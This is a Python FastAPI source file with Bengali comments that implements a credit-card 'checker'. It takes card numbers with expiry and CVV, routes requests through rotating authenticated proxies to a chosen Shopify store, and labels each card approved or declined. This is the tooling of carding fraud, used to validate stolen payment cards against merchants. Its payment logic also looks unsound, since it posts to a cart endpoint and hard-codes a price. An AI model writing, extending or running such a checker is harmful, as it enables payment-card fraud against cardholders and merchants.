from fastapi import FastAPI, Query
import requests
import json
import time

app = FastAPI()

# ========== হোম পেজ ==========
@app.get("/")
def root():
    return {"message": "API Running"}

# ========== শুধু রিটার্ন (পুরোনো) ==========
@app.get("/shopii")
def shopii(
    cc: str = Query(...),
    site: str = Query(...),
    proxy: str = Query(None)
):
    return {"cc": cc, "site": site, "proxy": proxy}

# ========== Shopify চেকার (নতুন) ==========
@app.get("/shopify")
def shopify_checker(
    site: str = Query(...),
    cc: str = Query(...),
    proxy: str = Query(...)
):
    start_time = time.time()
    
    # কার্ড ডেটা পার্স
    card_parts = cc.split("|")
    if len(card_parts) != 4:
        return {"error": "Invalid card format. Use cc|mm|yy|cvv"}
    card_number, month, year, cvv = card_parts
    
    # প্রক্সি পার্স
    proxy_parts = proxy.split(":")
    if len(proxy_parts) != 4:
        return {"error": "Invalid proxy format. Use ip:port:user:pass"}
    proxy_ip, proxy_port, proxy_user, proxy_pass = proxy_parts
    
    # প্রক্সি ডিকশনারি
    proxies = {
        "http": f"http://{proxy_user}:{proxy_pass}@{proxy_ip}:{proxy_port}",
        "https": f"http://{proxy_user}:{proxy_pass}@{proxy_ip}:{proxy_port}"
    }
    
    # Shopify কার্ট URL
    clean_site = site.replace("https://", "").replace("http://", "")
    checkout_url = f"https://{clean_site}/cart.json"
    
    # পেমেন্ট ডেটা
    payment_data = {
        "credit_card": {
            "number": card_number,
            "month": month,
            "year": year,
            "verification_value": cvv
        }
    }
    
    try:
        response = requests.post(
            checkout_url,
            json=payment_data,
            proxies=proxies,
            timeout=15,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json"
            }
        )
        
        elapsed_time = round(time.time() - start_time, 2)
        result = response.json()
        
        # স্ট্যাটাস চেক
        if "error" in result:
            status = "CARD_DECLINED"
            approved = False
        elif "payment" in result and result["payment"].get("status") == "success":
            status = "CARD_APPROVED"
            approved = True
        else:
            status = "CARD_DECLINED"
            approved = False
        
        return {
            "Response": status,
            "CC": cc,
            "Price": "57.50",
            "Gate": "Shopify Payments",
            "Site": site,
            "Charged": str(approved),
            "Approved": str(approved),
            "Time": f"{elapsed_time}s"
        }
        
    except requests.exceptions.Timeout:
        return {"error": "Request timed out. Try a faster proxy."}
    except Exception as e:
        return {"error": str(e)}
